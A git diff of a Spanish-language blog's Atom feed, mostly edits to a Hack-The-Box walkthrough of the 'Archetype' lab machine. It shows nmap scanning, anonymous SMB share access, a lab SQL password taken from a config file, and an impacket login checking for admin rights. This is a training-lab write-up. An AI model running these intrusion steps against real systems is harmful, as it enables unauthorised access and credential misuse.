@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Blog de Penserbjorne</title><link href="https://penserbjorne.com/" rel="alternate"></link><link href="https://penserbjorne.com/feeds/all.atom.xml" rel="self"></link><id>https://penserbjorne.com/</id><updated>2020-09-27T00:00:00-05:00</updated><subtitle>Otro sitio clíche de tecnología (que no sabe utilizar acentos) &gt;;v</subtitle><entry><title>Pelican (04), configuración del sitio (tema)</title><link href="https://penserbjorne.com/pelican-04-configuracion-del-sitio-tema-es-MX.html" rel="alternate"></link><published>2020-08-21T00:00:00-05:00</published><updated>2020-08-21T00:00:00-05:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-21:/pelican-04-configuracion-del-sitio-tema-es-MX.html</id><summary type="html">&lt;p&gt;Configuración para añadir un tema a un sitio con&amp;nbsp;Pelican&lt;/p&gt;</summary><content type="html">&lt;h1&gt;What is&amp;nbsp;this?&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Blog de Penserbjorne</title><link href="https://penserbjorne.com/" rel="alternate"></link><link href="https://penserbjorne.com/feeds/all.atom.xml" rel="self"></link><id>https://penserbjorne.com/</id><updated>2020-11-06T00:00:00-06:00</updated><subtitle>Otro sitio clíche de tecnología (que no sabe utilizar acentos) &gt;;v</subtitle><entry><title>Pelican (04), configuración del sitio (tema)</title><link href="https://penserbjorne.com/pelican-04-configuracion-del-sitio-tema-es-MX.html" rel="alternate"></link><published>2020-08-21T00:00:00-05:00</published><updated>2020-08-21T00:00:00-05:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-21:/pelican-04-configuracion-del-sitio-tema-es-MX.html</id><summary type="html">&lt;p&gt;Configuración para añadir un tema a un sitio con&amp;nbsp;Pelican&lt;/p&gt;</summary><content type="html">&lt;h1&gt;What is&amp;nbsp;this?&lt;/h1&gt;
 &lt;p&gt;Andamos con todo, anoche terminamos la
 &lt;a href="https://penserbjorne.com/pelican-03-configuracion-del-sitio-construccion-y-elementos-basicos-es-MX.html"&gt;tercera entrada de Pelican, para modificar la construcción del sitio y configurar algunas cositas del sitio&lt;/a&gt;,
 sé que no es mucho, pero es trabajo honesto&amp;nbsp;haha&lt;/p&gt;
@@ -535,7 +535,7 @@ invoke gh-pages
 responsivo por lo cual no es fácil de leer en dispositivos con pantallas
 medianas o pequeñas, el siguiente paso es configurar un tema responsivo, pero
 esto lo haremos en la siguiente entrada&amp;nbsp;:)&lt;/p&gt;
-&lt;p&gt;Que la fuerza te&amp;nbsp;acompañe.&lt;/p&gt;</content><category term="pelican"></category><category term="blog"></category><category term="pelican"></category></entry><entry><title>Hack-The-Box (0001) &gt; Starting point</title><link href="https://penserbjorne.com/hack-the-box-0001-starting-point-es-MX.html" rel="alternate"></link><published>2020-08-06T00:00:00-05:00</published><updated>2020-08-06T00:00:00-05:00</updated><author><name>penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-06:/hack-the-box-0001-starting-point-es-MX.html</id><summary type="html">&lt;p&gt;Anotaciones sobre la sección &amp;#8220;Starting point&amp;#8221; de&amp;nbsp;Hack-The-Box&lt;/p&gt;</summary><content type="html">&lt;h1&gt;This is not the intro&amp;nbsp;:)&lt;/h1&gt;
+&lt;p&gt;Que la fuerza te&amp;nbsp;acompañe.&lt;/p&gt;</content><category term="pelican"></category><category term="blog"></category><category term="pelican"></category></entry><entry><title>Hack-The-Box (0001) &gt; Starting point</title><link href="https://penserbjorne.com/hack-the-box-0001-starting-point-es-MX.html" rel="alternate"></link><published>2020-08-06T00:00:00-05:00</published><updated>2020-11-06T00:00:00-06:00</updated><author><name>penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-06:/hack-the-box-0001-starting-point-es-MX.html</id><summary type="html">&lt;p&gt;Anotaciones sobre la sección &amp;#8220;Starting point&amp;#8221; de&amp;nbsp;Hack-The-Box&lt;/p&gt;</summary><content type="html">&lt;h1&gt;This is not the intro&amp;nbsp;:)&lt;/h1&gt;
 &lt;p&gt;Ola k&amp;nbsp;ase.&lt;/p&gt;
 &lt;p&gt;Para este exacto momento en el que escribo esta linea de texto han pasado 146
 días desde que comenzó la pandemia del &lt;span class="caps"&gt;COVID&lt;/span&gt;-19 y pareciera que el tiempo se
@@ -596,6 +596,7 @@ los siguiente&amp;nbsp;elementos:&lt;/p&gt;
 &lt;li&gt;Reconocimiento&amp;nbsp;(Reconnaissance)&lt;/li&gt;
 &lt;li&gt;Enumeración&amp;nbsp;(Enumeration)&lt;/li&gt;
 &lt;li&gt;Movimiento lateral (Lateral&amp;nbsp;Movement)&lt;/li&gt;
+&lt;li&gt;Punto de partida&amp;nbsp;(Foothold)&lt;/li&gt;
 &lt;li&gt;Explotación&amp;nbsp;(Explotation)&lt;/li&gt;
 &lt;li&gt;Escalada de privilegios (Privilege&amp;nbsp;Escalation)&lt;/li&gt;
 &lt;li&gt;Explotación posterior (Post&amp;nbsp;Explotation)&lt;/li&gt;
@@ -612,13 +613,13 @@ daremos contexto al comando o a la&amp;nbsp;acción.&lt;/p&gt;
 dedicar una entrada a cada una por lo que te invito pases a la siguiente entrada
 en la cual comenzaremos con la maquina
 &lt;a href="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html"&gt;&lt;strong&gt;Archetype&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;#HappyHacking&lt;/code&gt;&lt;/p&gt;</content><category term="htb"></category><category term="blog"></category><category term="penserbjorne"></category><category term="htb"></category><category term="pentest"></category><category term="hacking"></category></entry><entry><title>Hack-The-Box (0002) &gt; Starting point &gt; Archetype</title><link href="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html" rel="alternate"></link><published>2020-08-06T00:00:00-05:00</published><updated>2020-08-11T00:00:00-05:00</updated><author><name>penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-06:/hack-the-box-0002-starting-point-archetype-es-MX.html</id><summary type="html">&lt;p&gt;Anotaciones sobre la máquina &amp;#8220;Archetype&amp;#8221; de la sección &amp;#8220;Starting point&amp;#8221; de&amp;nbsp;Hack-The-Box&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Archetype&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;#HappyHacking&lt;/code&gt;&lt;/p&gt;</content><category term="htb"></category><category term="blog"></category><category term="penserbjorne"></category><category term="htb"></category><category term="pentest"></category><category term="hacking"></category></entry><entry><title>Hack-The-Box (0002) &gt; Starting point &gt; Archetype</title><link href="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html" rel="alternate"></link><published>2020-08-06T00:00:00-05:00</published><updated>2020-11-06T00:00:00-06:00</updated><author><name>penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-06:/hack-the-box-0002-starting-point-archetype-es-MX.html</id><summary type="html">&lt;p&gt;Anotaciones sobre la máquina &amp;#8220;Archetype&amp;#8221; de la sección &amp;#8220;Starting point&amp;#8221; de&amp;nbsp;Hack-The-Box&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Archetype&lt;/h1&gt;
 &lt;p&gt;Para comenzar con esta serie de anotaciones sobre la sección &lt;em&gt;Starting point&lt;/em&gt;
 arrancaremos con la máquina &lt;em&gt;Archetype&lt;/em&gt;. Si no sabes bien de que hablo te
 recomiendo que primero leas la
 &lt;a href="https://penserbjorne.com/hack-the-box-0001-starting-point-es-MX.html"&gt;entrada anterior&lt;/a&gt;.&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;máquina:&lt;/strong&gt;&amp;nbsp;Archetype&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Máquina:&lt;/strong&gt;&amp;nbsp;Archetype&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;&lt;span class="caps"&gt;SO&lt;/span&gt;:&lt;/strong&gt;&amp;nbsp;Windows&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;&lt;span class="caps"&gt;IP&lt;/span&gt;:&lt;/strong&gt;&amp;nbsp;10.10.10.27&lt;/li&gt;
 &lt;/ul&gt;
@@ -661,15 +662,14 @@ con los siguientes&amp;nbsp;parámetros:&lt;/p&gt;
 &lt;li&gt;&lt;code&gt;-p-&lt;/code&gt;: Indicamos que vamos a escanear todos los puertos de la&amp;nbsp;máquina.&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;--min-rate=1000&lt;/code&gt;: Indicamos que enviaremos al menos 1000 paquetes por segundos para realizar el&amp;nbsp;escaneo.&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-T4&lt;/code&gt;: Indicamos una &lt;em&gt;plantilla de tiempo&lt;/em&gt;. Básicamente le decimos a &lt;code&gt;nmap&lt;/code&gt;
-que los tiempos haga un &lt;em&gt;análisis agresivo&lt;/em&gt;. El modo agresivo hace que los
+que haga un &lt;em&gt;análisis agresivo&lt;/em&gt;. El modo agresivo hace que los
 análisis sean más rápidos al asumir que estas en una red razonablemente más
 rápida y&amp;nbsp;fiable.&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;10.10.10.27&lt;/code&gt;: Indicamos la &lt;span class="caps"&gt;IP&lt;/span&gt; del objetivo, en este caso es la máquina con la que vamos a&amp;nbsp;trabajar.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;La salida del comando anterior nos muestra la lista de puertos abiertos como
 se ve a&amp;nbsp;continuación.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└──╼ &lt;span class="nv"&gt;$nmap&lt;/span&gt; -p- --min-rate&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt; -T4 &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27
-Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2020&lt;/span&gt;-08-06 &lt;span class="m"&gt;21&lt;/span&gt;:35 CDT
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2020&lt;/span&gt;-08-06 &lt;span class="m"&gt;21&lt;/span&gt;:35 CDT
 Warning: &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27 giving up on port because retransmission cap hit &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.
 Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27
 Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.088s latency&lt;span class="o"&gt;)&lt;/span&gt;.
@@ -692,10 +692,10 @@ Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&g
 
 
 &lt;p&gt;La salida anterior la pasamos a &lt;code&gt;grep ^[0-9]&lt;/code&gt; para que nos muestre solamente
-solamente el listado de puertos sin la información de &lt;code&gt;nmap&lt;/code&gt;. Esto se lo
-indicamos a &lt;code&gt;grep&lt;/code&gt; utilizando la expresión regular &lt;code&gt;^[0-9]&lt;/code&gt; la cual
-especifica que busque las lineas que comienzan con valores numéricos que van
-del 0 al 9. La salida es como se muestra a&amp;nbsp;continuación.&lt;/p&gt;
+el listado de lineas donde aparecen puertos, esto para quitar la información
+extra de &lt;code&gt;nmap&lt;/code&gt;. Esto se lo indicamos a &lt;code&gt;grep&lt;/code&gt; utilizando la expresión regular
+&lt;code&gt;^[0-9]&lt;/code&gt; la cual especifica que busque las lineas que comienzan con valores
+numéricos que van del 0 al 9. La salida es como se muestra a&amp;nbsp;continuación.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="m"&gt;135&lt;/span&gt;/tcp   open  msrpc
 &lt;span class="m"&gt;139&lt;/span&gt;/tcp   open  netbios-ssn
 &lt;span class="m"&gt;445&lt;/span&gt;/tcp   open  microsoft-ds
@@ -715,7 +715,7 @@ exclusivamente el número de los puertos abiertos. Esto se lo indicamos a &lt;co
 con los siguientes&amp;nbsp;parámetros:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;-d '/'&lt;/code&gt;: Indicamos el carácter delimitador. Esto vendría a ser nuestro
-carácter para &lt;em&gt;separar&lt;/em&gt; la cadena en &lt;em&gt;columna&lt;/em&gt;, Algo así como la coma &lt;em&gt;,&lt;/em&gt; de
+carácter para &lt;em&gt;separar&lt;/em&gt; la cadena en &lt;em&gt;columna&lt;/em&gt;, Algo así como la coma &lt;code&gt;,&lt;/code&gt; de
 un &lt;span class="caps"&gt;CSV&lt;/span&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-f 1&lt;/code&gt;: Indicamos que retorne o imprima el primer campo de los resultados.
 En este caso si observamos la salida del comando anterior podemos asumir que
@@ -723,7 +723,7 @@ las lineas de texto se van a separar en dos columnas debido a que cada linea
 tiene el carácter &lt;code&gt;/&lt;/code&gt;. El primer campo tendrá el número de puerto y el segundo
 campo tendrá la descripción del&amp;nbsp;puerto.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;La salida sel comando anterior es la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;p&gt;La salida del comando anterior es la&amp;nbsp;siguiente:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="m"&gt;135&lt;/span&gt;
 &lt;span class="m"&gt;139&lt;/span&gt;
 &lt;span class="m"&gt;445&lt;/span&gt;
@@ -747,7 +747,7 @@ campo tendrá la descripción del&amp;nbsp;puerto.&lt;/li&gt;
 
 &lt;p&gt;La salida anterior la pasamos a &lt;code&gt;sed s/,$//&lt;/code&gt; para simplemente extraer la
 ultima coma y dejar una lista limpia de puertos abiertos separados por comas.
-Esto lo hacemos con la expresión &lt;code&gt;s/,$//&lt;/code&gt; la cual se pasa a &lt;code&gt;sed&lt;/code&gt; y respeta
+Esto lo hacemos con la expresión &lt;code&gt;s/,$//&lt;/code&gt; la cual se pasa a &lt;code&gt;sed&lt;/code&gt; que respeta
 la sintaxis &lt;code&gt;s/regexp/replacement/flags&lt;/code&gt;. La expresión utilizada busca la
 última coma de la linea y la&amp;nbsp;borra.&lt;/p&gt;
 &lt;p&gt;La salida del comando anterior es la&amp;nbsp;siguiente:&lt;/p&gt;
@@ -849,7 +849,7 @@ y están asociados a dos servicios:
 conectarnos de manera anonima en busqueda de archivos interesantes. Para esto
 recomiendan utilizar &lt;code&gt;smbclient&lt;/code&gt; la cual es un cliente de conexiones
 perteneciente al proyecto
-&lt;a href="https://es.wikipedia.org/wiki/Samba_(software)"&gt;Samba&lt;/a&gt; en sistemas tipo&amp;nbsp;Unix.&lt;/p&gt;
+&lt;a href="https://es.wikipedia.org/wiki/Samba_(software)"&gt;Samba&lt;/a&gt; en sistemas tipo &lt;code&gt;Unix&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;El comando recomendado&amp;nbsp;es:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbclient -N -L &lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.27&lt;span class="se"&gt;\\&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -864,13 +864,11 @@ conectar. En este caso nos estamos conectando desde un sistema tipo &lt;code&gt;
 sistema basado en &lt;code&gt;DOS&lt;/code&gt; por lo cual utilizaremos la sintaxis de
 &lt;code&gt;DOS&lt;/code&gt; la cual requiere barras invertidas (&lt;code&gt;\&lt;/code&gt;). Al estar en un sistema
 tipo &lt;code&gt;Unix&lt;/code&gt; tenemos que escapar la barra invertida con una barra invertida
-(&lt;code&gt;\\\\&lt;/code&gt;), por eso al ver al inicio cuatro barras invertidas y dos al inicio, en
+(&lt;code&gt;\\\\&lt;/code&gt;), por eso al inicio vemos cuatro barras invertidas y dos al final, en
 realidad la sintaxis de &lt;code&gt;DOS&lt;/code&gt; lo tomaría como dos barras al inicio y una al&amp;nbsp;final.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;El resultado del comando anterior&amp;nbsp;es:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└──╼ &lt;span class="nv"&gt;$smbclient&lt;/span&gt; -N -L &lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.27&lt;span class="se"&gt;\\&lt;/span&gt;
-
-    Sharename       Type      Comment
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    Sharename       Type      Comment
     ---------       ----      -------
     ADMIN$          Disk      Remote Admin
     backups         Disk      
@@ -881,7 +879,7 @@ SMB1 disabled -- no workgroup available
 
 
 &lt;p&gt;Revisando la salida del comando podemos observar que hay una carpeta interesante
-llamada &lt;code&gt;backup&lt;/code&gt; la cual podria contener información interesante. Procederemos
+llamada &lt;code&gt;backups&lt;/code&gt; la cual podria contener información interesante. Procederemos
 a conectarnos a esa carpeta con el comando&amp;nbsp;recomendado:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbclient -N &lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.27&lt;span class="se"&gt;\\&lt;/span&gt;backups
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -936,7 +934,7 @@ directorio en sistemas basados en &lt;code&gt;DOS&lt;/code&gt;, este caso, el di
 &lt;code&gt;prod.dtsConfig&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Los archivos con extensión
 &lt;a href="https://abrirarchivos.info/extension/dtsconfig"&gt;.dtsConfig&lt;/a&gt;
-son archivos de configuración con sintaxis &lt;code&gt;XML&lt;/code&gt; utilizados en para aplicar
+son archivos de configuración con sintaxis &lt;code&gt;XML&lt;/code&gt; utilizados para aplicar
 &lt;em&gt;valores de propiedad&lt;/em&gt; a los paquetes de
 &lt;em&gt;Servicios de Integración de &lt;span class="caps"&gt;SQL&lt;/span&gt; Server&lt;/em&gt; (&lt;code&gt;SSIS&lt;/code&gt;). Por lo cual podemos obtener
 algo de información de este&amp;nbsp;archivo.&lt;/p&gt;
@@ -951,10 +949,6 @@ del archivo &lt;code&gt;prod.dtsConfig&lt;/code&gt; a nuestro equipo. Con el arc
 podemos ver su&amp;nbsp;contenido.&lt;/p&gt;
 &lt;p&gt;De vuelta a nuestro equipo, podemos utilizar el comando &lt;code&gt;cat prod.dtsConfig&lt;/code&gt; el
 cual nos arrojara el contenido del&amp;nbsp;archivo.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└──╼ &lt;span class="nv"&gt;$cat&lt;/span&gt; prod.dtsConfig
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;DTSConfiguration&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;DTSConfigurationHeading&amp;gt;&lt;/span&gt;
         &lt;span class="nt"&gt;&amp;lt;DTSConfigurationFileInfo&lt;/span&gt; &lt;span class="na"&gt;GeneratedBy=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;...&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;GeneratedFromPackageName=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;...&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;GeneratedFromPackageID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;...&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;GeneratedDate=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;20.1.2019 10:01:34&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
@@ -971,13 +965,358 @@ cual nos arrojara el contenido del&amp;nbsp;archivo.&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;La cadena anterior corresponde a la cadena para una conexión &lt;span class="caps"&gt;SQL&lt;/span&gt; asociada al
-usuario &lt;code&gt;ARCHETYPE\sql_svc&lt;/code&gt; y su contraseña que es &lt;code&gt;M3g4c0rp123&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;La cadena anterior corresponde a la cadena para una conexión &lt;code&gt;SQL&lt;/code&gt; asociada al
+usuario &lt;code&gt;ARCHETYPE\sql_svc&lt;/code&gt; (de &lt;code&gt;Windows&lt;/code&gt;) y su contraseña que es &lt;code&gt;M3g4c0rp123&lt;/code&gt;.&lt;/p&gt;
 &lt;h2&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;Ya tenemos un usuario y contraseña, por lo que podemos intentar dar un primer
 paso firme hacia nuestra máquina objetivo &amp;#8230; peeeeero, eso será después porqué
 en este momento necesito dejar el post pausado una vez más y conectarme a hacer
 algunos pendientes del trabajo&amp;nbsp;:)&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Continuación:&amp;nbsp;2020-11-06&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Ola k ase &amp;#8230; bueno, ya pasaron casi tres meses de que comencé a escribir este
+texto y pues apenas vamos a darle un cierre haha en realidad hubo muchas cosas
+que se escribieron en este tiempo pero algunas las borre sin querer y otras
+estan a medias esperando a ser publicada, en fin, continuemos con lo que toca&amp;nbsp;aquí.&lt;/p&gt;
+&lt;p&gt;Bien, ya hemos obtenido un usuario y contraseña para una conexión de
+&lt;code&gt;SQL Server&lt;/code&gt; de un usuario de &lt;code&gt;Windows&lt;/code&gt;, hay que tener en cuenta que aunque el
+usuario es de &lt;code&gt;Windows&lt;/code&gt; la configuración de permisos puede ser diferente dentro de
+&lt;code&gt;SQL Server&lt;/code&gt; que en &lt;code&gt;Windows&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Para conectar a &lt;code&gt;SQL Server&lt;/code&gt; podemos utilizar &lt;a href="https://github.com/SecureAuthCorp/impacket"&gt;impacket&lt;/a&gt; el cual es una colección de clases en &lt;code&gt;Python&lt;/code&gt; para
+trabajar con protocolos de&amp;nbsp;red.&lt;/p&gt;
+&lt;p&gt;Para obtener &lt;code&gt;impacket&lt;/code&gt; necesitamos clonarlo de su repositorio de &lt;code&gt;GitHub&lt;/code&gt; ya
+que no viene instalado por defecto en nuestro sistema. Clonamos el&amp;nbsp;repo.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git clone https://github.com/SecureAuthCorp/impacket.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;impacket&lt;/code&gt; cuenta con algunos scripts de ejemplo en la carpeta &lt;code&gt;/examples&lt;/code&gt;, de
+ahí podemos utilizar &lt;code&gt;mssqlclient.py&lt;/code&gt; el cual sirve para realizar conexiones a
+servidores de &lt;code&gt;SQL Server&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;El comando recomendado&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Pero en nuestro caso utilizaremos el&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Como podemos ver, hemos mandado &lt;code&gt;mssqlclient.py&lt;/code&gt; directamente a la entrada de
+&lt;code&gt;Python3&lt;/code&gt;, y hemos indicado las&amp;nbsp;banderas:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ARCHETYPE/sql_svc&lt;/code&gt;: es el&amp;nbsp;usuario.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@10.10.10.27&lt;/code&gt;: es el host o equipo a&amp;nbsp;conectarnos.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-windows-auth&lt;/code&gt;: indicamos que nos vamos a autenticar con las credenciales de &lt;code&gt;Windows&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Al introducir el comando nos va a solicitar la contraseña del usuario, la
+obtuvimos anteriormente (&lt;code&gt;M3g4c0rp123&lt;/code&gt;). Se realizará la conexión y se nos
+habilitará una terminal de &lt;code&gt;SQL&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Impacket v0.9.21 - Copyright &lt;span class="m"&gt;2020&lt;/span&gt; SecureAuth Corporation
+
+Password:
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Encryption required, switching to TLS
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ENVCHANGE&lt;span class="o"&gt;(&lt;/span&gt;DATABASE&lt;span class="o"&gt;)&lt;/span&gt;: Old Value: master, New Value: master
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ENVCHANGE&lt;span class="o"&gt;(&lt;/span&gt;LANGUAGE&lt;span class="o"&gt;)&lt;/span&gt;: Old Value: , New Value: us_english
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ENVCHANGE&lt;span class="o"&gt;(&lt;/span&gt;PACKETSIZE&lt;span class="o"&gt;)&lt;/span&gt;: Old Value: &lt;span class="m"&gt;4096&lt;/span&gt;, New Value: &lt;span class="m"&gt;16192&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; INFO&lt;span class="o"&gt;(&lt;/span&gt;ARCHETYPE&lt;span class="o"&gt;)&lt;/span&gt;: Line &lt;span class="m"&gt;1&lt;/span&gt;: Changed database context to &lt;span class="s1"&gt;&amp;#39;master&amp;#39;&lt;/span&gt;.
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; INFO&lt;span class="o"&gt;(&lt;/span&gt;ARCHETYPE&lt;span class="o"&gt;)&lt;/span&gt;: Line &lt;span class="m"&gt;1&lt;/span&gt;: Changed language setting to us_english.
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ACK: Result: &lt;span class="m"&gt;1&lt;/span&gt; - Microsoft SQL Server &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;140&lt;/span&gt; &lt;span class="m"&gt;3232&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;!&lt;span class="o"&gt;]&lt;/span&gt; Press &lt;span class="nb"&gt;help&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; extra shell commands
+SQL&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ya tenemos una conexión en el servidor. Ahora vamos a verificar si tenemos
+permisos de administrador. Para esto podemos utilizar la función
+&lt;a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15"&gt;IS_SRVROLEMEMBER&lt;/a&gt;
+la cual nos permite saber si un inicio de sesión de &lt;code&gt;SQL Server&lt;/code&gt; es miembro
+de un rol especifico del&amp;nbsp;servidor.&lt;/p&gt;
+&lt;p&gt;La sintaxis de la función&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;IS_SRVROLEMEMBER&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;role&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;En la cual tenemos dos&amp;nbsp;argumentos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;role&lt;/code&gt;: indicamos el rol a revisar que puede ser alguno de los siguientes.&lt;ul&gt;
+&lt;li&gt;sysadmin&lt;/li&gt;
+&lt;/ul&gt;
